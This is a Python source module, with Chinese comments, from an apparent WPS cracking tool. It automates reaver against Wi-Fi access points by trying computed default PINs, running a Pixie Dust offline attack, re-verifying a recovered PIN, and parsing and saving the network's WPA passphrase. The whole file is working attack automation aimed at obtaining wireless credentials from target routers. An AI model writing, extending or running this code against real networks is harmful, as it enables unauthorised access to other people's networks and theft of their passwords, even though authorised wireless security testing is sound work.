"""Finite default-PIN validation with an optional offline fallback."""
import re
import sys
import time
from pathlib import Path, PurePosixPath

from .command_builder import normalize_bssid, quote_argument
from .models import CaptureCleanupError
from .wps_defaults import (
    DEFAULT_QUICK_ROUNDS,
    DEFAULT_QUICK_SECONDS,
    DefaultPinCandidate,
    default_pin_candidates,
)
from .wps_models import WpsTargetResult, WpsUpdate
from .wps_observation import PIXIE_TOOL_MISSING, analyze
from .wps_results import write_wps_result
from .wps_protocol_evidence import WpsProtocolEvidence
from .wps_timing import WpsCandidateTiming

_REJECTED = re.compile(r"quitting after 1 crack attempts", re.I)
_PIN = re.compile(r"WPS PIN:\s*['\"]?([0-9]{8})(?![0-9])", re.I)
_PSK = re.compile(r"WPA PSK:\s*(.+)", re.I)


def _bounded_seconds(value):
    try:
        number = int(value)
    except (TypeError, ValueError, OverflowError):
        number = DEFAULT_QUICK_SECONDS
    return max(0, min(number, 3600))


def _bounded_rounds(value):
    try:
        number = int(value)
    except (TypeError, ValueError, OverflowError):
        number = DEFAULT_QUICK_ROUNDS
    return max(1, min(number, 20))


def quick_skip(target, options):
    if default_pin_candidates(target.bssid, options):
        return None
    return WpsTargetResult(
        bssid=target.bssid, ssid=target.ssid, mode="second",
        note="未匹配已知默认 PIN 算法，已跳过速测；不代表目标安全或不支持其他 WPS 测试。")


def run_pin_process(process_manager, command, session_id, workspace, budget,
                    cancel_event=None, *, evidence=None, timing=None,
                    diagnostic=None, report=None, phase="", attempt_number=0):
    """Run one reaver process and return (pin, psk, rejected, terminal, current, status).

    budget is the maximum seconds for this one candidate; 0 means no time cap.
    The process is always stopped by its own handle, never by name.
    """
    started = time.monotonic()
    deadline = started + budget if budget else None
    max_runtime = int(budget) + 10 if budget else 0
    if timing is not None:
        timing.begin_phase()
    if diagnostic is not None:
        diagnostic.phase(attempt_number)
    if cancel_event is not None and cancel_event.is_set():
        raise RuntimeError("WPS 任务已取消。")
    handle = process_manager.start(
        "reaver", command, f"{session_id}-quick{attempt_number}",
        str(workspace.remote_dir), cancel_event, max_runtime=max_runtime)
    pin = psk = ""
    rejected = False
    terminal = ""
    current_pin = status = ""

    def check_cancel():
        if cancel_event is not None and cancel_event.is_set():
            raise RuntimeError("WPS 任务已取消。")

    def consume(text):
        nonlocal pin, psk, rejected, terminal, current_pin, status
        if evidence is not None:
            evidence.feed(text)
        if timing is not None:
            timing.feed(text)
        if diagnostic is not None:
            diagnostic.feed(text)
        observation = analyze(text)
        if observation.current_pin:
            current_pin = observation.current_pin
        if observation.status:
            status = observation.status
        match = _PIN.search(text)
        if match:
            pin = match.group(1)
        match = _PSK.search(text)
        if match:
            psk = match.group(1).strip().strip(" '\"")
        if _REJECTED.search(text):
            rejected = True
        if observation.stage in {"blocked", "tool_error"}:
            terminal = status
        elif "transaction failed" in text.lower() or "failed to associate" in text.lower():
            terminal = "目标关联或 WPS 交互未完成，不能判定候选 PIN 是否有效"

    def notify():
        if report is not None:
            report(phase, current_pin, status, started)

    stop_reason = "time_budget"
    try:
        notify()
        while deadline is None or time.monotonic() < deadline:
            check_cancel()
            running = process_manager.is_running(handle, cancel_event)
            consume(process_manager.read_log_tail(handle, 100, cancel_event))
            notify()
            if pin or psk or rejected or terminal or not running:
                stop_reason = ("credential_found" if pin or psk else
                               "rejected" if rejected else
                               "terminal" if terminal else "native_exit")
                break
            if cancel_event is not None:
                cancel_event.wait(0.5)
            else:
                time.sleep(0.5)
        consume(process_manager.read_log_tail(handle, 100, None))
        check_cancel()
    finally:
        primary = sys.exc_info()[1]
        if primary is not None:
            stop_reason = "cancelled" if cancel_event is not None and cancel_event.is_set() else "exception"
        cleanup = None
        try:
            process_manager.stop(handle, None, graceful_signal="INT")
        except Exception as exc:
            cleanup = exc
        if diagnostic is not None:
            diagnostic.event("process_stopped", reason=stop_reason, cleanup_ok=cleanup is None)
            try:
                diagnostic.feed(process_manager.read_log_tail(handle, 100, None), final=True)
            except Exception:
                diagnostic.event("final_log_unavailable")
        if cleanup is not None:
            note = f"停止默认 PIN 速测进程失败：{cleanup}"
            raise CaptureCleanupError(f"{primary}；{note}" if primary else note, (note,)) from cleanup
    return pin, psk, rejected, terminal, current_pin, status


class QuickWpsCapture:
    def __init__(self, process_manager, base_builder):
        self.process_manager = process_manager
        self.base_builder = base_builder

    def _command(self, workspace, monitor_interface, target, options, workspace_manager,
                 cancel_event, index, suffix, run_mode, extra):
        session_path = str(PurePosixPath(workspace.remote_dir) / f"quick-{index}-{suffix}.wpc")
        base = self.base_builder(
            workspace, monitor_interface, target, run_mode, options,
            workspace_manager, cancel_event, session_path=session_path)
        return f"{base} {extra}"

    def run(self, workspace, monitor_interface, session_id, target, options,
            local_output_dir, workspace_manager, index, total_targets,
            cancel_event=None, progress_callback=None, *, diagnostic=None, source_rotation=None):
        online = list(default_pin_candidates(target.bssid, options))
        remembered = str(options.get("remembered_pin", "") or "").strip()
        if not (remembered.isascii() and remembered.isdigit() and len(remembered) == 8):
            remembered = ""
        if remembered:
            online = [item for item in online if item.pin != remembered]
        if not online and not remembered:
            return quick_skip(target, options)

        bssid = normalize_bssid(target.bssid)
        label = str(target.ssid or bssid)
        target_session = f"{session_id}-t{index}"
        seconds = _bounded_seconds(options.get("quick_seconds", DEFAULT_QUICK_SECONDS))
        rounds = _bounded_rounds(options.get("quick_rounds", DEFAULT_QUICK_ROUNDS))
        started = time.monotonic()
        evidence = WpsProtocolEvidence()
        timing = WpsCandidateTiming()
        pin = psk = ""
        terminal = ""
        rejected = 0
        offline_attempted = False
        offline_warning = ""
        attempt_number = 0
        current_pin = status = ""
        ending = "默认 PIN 速测未完成"

        def report(phase, candidate, candidate_status, attempt_started):
            if progress_callback is None:
                return
            candidate_elapsed, average_per_minute = timing.snapshot()
            elapsed = int(time.monotonic() - attempt_started)
            if seconds:
                elapsed = min(seconds, elapsed)
            progress_callback(WpsUpdate(
                elapsed=elapsed, total=seconds, target_label=label,
                target_index=index, target_total=total_targets, phase=phase,
                current_pin=candidate, status=candidate_status, target_bssid=bssid,
                candidate_elapsed=candidate_elapsed, average_per_minute=average_per_minute))

        def check_cancel():
            if cancel_event is not None and cancel_event.is_set():
                raise RuntimeError("WPS 任务已取消。")

        def attempt_candidate(candidate, phase):
            """跑一个在线候选；返回 (pin, psk, rejected, terminal)。"""

            nonlocal attempt_number, current_pin, status
            attempt_number += 1
            candidate_options = options
            if source_rotation is not None:
                candidate_options = source_rotation.next_options(options, cancel_event)
                check_cancel()
                if diagnostic is not None:
                    diagnostic.event("source_rotated", verified=True)
            command = self._command(
                workspace, monitor_interface, target, candidate_options,
                workspace_manager, cancel_event, index, attempt_number - 1,
                "second", f"-p {quote_argument(candidate.pin)}")
            # reaver 1.6.5（OpenWrt 19.07）的 -p 不会自动限制尝试次数，必须显式 -g 1，
            # 否则候选被拒后会继续穷举，既拖满时间预算又可能触发 WPS 锁定。
            command += " -g 1"
            found_pin, found_psk, was_rejected, found_terminal, current_pin, status = run_pin_process(
                self.process_manager, command, target_session, workspace, seconds,
                cancel_event, evidence=evidence, timing=timing, diagnostic=diagnostic,
                report=report, phase=phase, attempt_number=attempt_number)
            return found_pin, found_psk, was_rejected, found_terminal

        def run_sequence(sequence):
            """按顺序尝试，拿到密码/PIN 或遇到终止信号时返回 True。"""

            nonlocal pin, psk, terminal, rejected, offline_attempted, offline_warning, ending
            for kind, candidate, phase in sequence:
                check_cancel()
                if psk or terminal:
                    return True
                if kind == "offline":
                    offline_attempted = True
                    found_pin, found_psk, found_terminal, warning = self._offline(
                        workspace, monitor_interface, target, options, workspace_manager,
                        cancel_event, index, target_session, seconds, report)
                    offline_warning = warning or offline_warning
                    was_rejected = False
                else:
                    found_pin, found_psk, was_rejected, found_terminal = attempt_candidate(candidate, phase)
                if found_psk:
                    psk = found_psk
                    pin = found_pin or pin
                    ending = "已获取密码"
                    return True
                if found_pin:
                    pin = found_pin
                    if found_terminal:
                        terminal = found_terminal
                    ending = "已拿到 PIN，正在验证密码" if not terminal else terminal
                    return True
                if was_rejected:
                    rejected += 1
                    continue
                if found_terminal:
                    terminal = found_terminal
                    ending = terminal
                    return True
            return False

        for round_number in range(rounds):
            if psk or terminal:
                break
            sequence = []
            if round_number == 0:
                # 第一轮：记住的 PIN → pin24 → 离线 Pin → 其余在线候选。
                if remembered:
                    sequence.append(("online", DefaultPinCandidate(remembered, "已记住"), "已记住的 PIN"))
                if online:
                    sequence.append((
                        "online", online[0],
                        f"秒 Pin 第1/{rounds}轮 第1/{len(online)}个"))
                sequence.append(("offline", None, "离线 Pin（Pixie Dust）"))
                for number, candidate in enumerate(online[1:], start=2):
                    sequence.append((
                        "online", candidate,
                        f"秒 Pin 第1/{rounds}轮 第{number}/{len(online)}个"))
            else:
                # 后续轮只重复在线候选，离线 Pin 每个目标只跑一次。
                for number, candidate in enumerate(online, start=1):
                    sequence.append((
                        "online", candidate,
                        f"秒 Pin 第{round_number + 1}/{rounds}轮 第{number}/{len(online)}个"))
            if run_sequence(sequence):
                break

        if pin and not psk and not terminal:
            verify_pin, verify_psk = self._verify(
                workspace, monitor_interface, target, options, workspace_manager,
                cancel_event, index, target_session, seconds, report, pin)
            if verify_psk:
                psk = verify_psk
                ending = "已获取密码"
            elif verify_pin:
                pin = verify_pin

        if psk:
            ending = "已获取密码"
        elif pin:
            ending = "；".join(filter(None, [
                "已拿到 PIN，未取得密码", terminal, status]))
        elif terminal:
            ending = terminal
        elif offline_attempted:
            ending = "默认 PIN 速测与离线 Pin 均未取得密码"
        elif rejected:
            ending = f"{rejected} 个默认 PIN 候选均已确认未通过；不转入常规穷举"
        note = "；".join(filter(None, [
            ending, status, offline_warning if not (pin or psk) else "",
            evidence.describe() if not (pin or psk) else ""]))
        result_file = write_wps_result(local_output_dir, label, bssid, pin, psk)
        timing.freeze()
        report("结束", "", "", started)
        return WpsTargetResult(
            bssid=bssid, ssid=label, mode="second",
            pin_ok=bool(pin), psk_ok=bool(psk),
            tried_seconds=max(0, int(time.monotonic() - started)),
            result_file=result_file, note=note, pin=pin)

    def _offline(self, workspace, monitor_interface, target, options, workspace_manager,
                 cancel_event, index, session_id, seconds, report):
        command = self._command(
            workspace, monitor_interface, target, options, workspace_manager,
            cancel_event, index, "offline", "second", "-K 1")
        pin, psk, _rejected, terminal, _current, _status = run_pin_process(
            self.process_manager, command, session_id, workspace, seconds,
            cancel_event, report=report, phase="离线 Pin（Pixie Dust）",
            attempt_number=9000 + index)
        warning = ""
        if terminal == PIXIE_TOOL_MISSING:
            # 缺 pixiewps 只影响离线 Pin，不能因此放弃后续在线候选。
            warning, terminal = terminal, ""
        return pin, psk, terminal, warning

    def _verify(self, workspace, monitor_interface, target, options, workspace_manager,
                cancel_event, index, session_id, seconds, report, pin):
        command = self._command(
            workspace, monitor_interface, target, options, workspace_manager,
            cancel_event, index, "verify", "second", f"-p {quote_argument(pin)}")
        command += " -g 1"
        new_pin, psk, _rejected, _terminal, _current, _status = run_pin_process(
            self.process_manager, command, session_id, workspace, seconds,
            cancel_event, report=report, phase="验证已获取的 PIN",
            attempt_number=9100 + index)
        return new_pin, psk
